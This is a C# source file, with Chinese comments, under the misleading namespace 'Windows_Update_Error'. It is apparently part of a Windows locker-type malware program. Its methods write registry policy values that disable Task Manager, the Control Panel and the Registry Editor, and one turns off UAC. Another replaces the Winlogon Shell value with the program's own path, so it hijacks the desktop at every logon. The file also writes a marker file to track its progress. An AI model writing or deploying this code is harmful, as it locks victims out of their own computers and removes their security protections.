using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Windows_Update_Error
{
    internal class Regedit_Set
    {
        public void Disable_Settings()
        {
            RegistryKey key = Registry.CurrentUser;            //打开注册表HKEY_CURRENT_USER基项
            RegistryKey software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            software.SetValue("NoControlPanel", 1);         //创建NoControlPanel键，值设置为1
            software =key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            software.SetValue("DisableTaskMgr",1);           //创建DisableTaskMgr键，值设置为1
            software.Close();
            key.Close();
        }
        public void Disable_Regedit()
        {
            RegistryKey key = Registry.CurrentUser;             //打开注册表HKEY_CURRENT_USER基项
            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System",true);
            if (software == null)       //如果不存在，则创建
            {
                software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            software.SetValue("DisableRegistryTools", 1);          //将DisableRegistryTools键的值改为1
            software.Close();
            key.Close();
        }
        public void Start_Update(string a)
        {
            try
            {
                StreamWriter writer = new StreamWriter("Error_m1.txt", false, Encoding.UTF8);           //创建StreamWriter对象
                writer.Write(a);        //将数据写入Error_m1.txt
                writer.Flush();         //确保数据已经写入文件
                writer.Close();        //关闭文件流
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        public string Start_Detection()
        {
            string path = "Error_m1.txt";
            FileInfo fileInfo = new FileInfo(path);
            if(fileInfo.Exists==false)        //如果文件不存在，则创建它
            {
                try
                {
                    StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8);       //创建StreamWriter对象
                    writer.Write("114514");          //将114514写入文件
                    writer.Flush();         //确保数据写入文件
                    writer.Close();        //关闭文件流
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
            StreamReader sr = new StreamReader(path,Encoding.UTF8);              //创建StreamReader对象
            string read=sr.ReadToEnd();              //读取文件里的所有内容
            sr.Close();        //关闭文件流
            return read;
        }
        public void UAC_OFF()
        {
            RegistryKey key = Registry.LocalMachine;        //打开注册表HKEY_LOCAL_MACHINE基项
            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);          //打开SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System项
            if (software == null)        //如果没有，则创建
            {
                software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            software.SetValue("EnableLUA", 0);       //将EnableLUA键的值改为0
            software.Close();
            key.Close();
        }
        public void PC_Start()
        {
            try
            {
                string local_1 = Process.GetCurrentProcess().MainModule.FileName;            //获取自身进程的完整路径
                RegistryKey key = Registry.LocalMachine;
                RegistryKey software=key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);         //打开SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon项
                if (software == null)        //如果没有，则创建
                {
                    software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                }
                software.SetValue("Shell", local_1);              //将Shell的值改为自身程序的完整路径
                software.Close();
                key.Close ();
            }
            catch(Exception ex) 
            { 
                MessageBox.Show(ex.Message);
            }
        }
    }
}
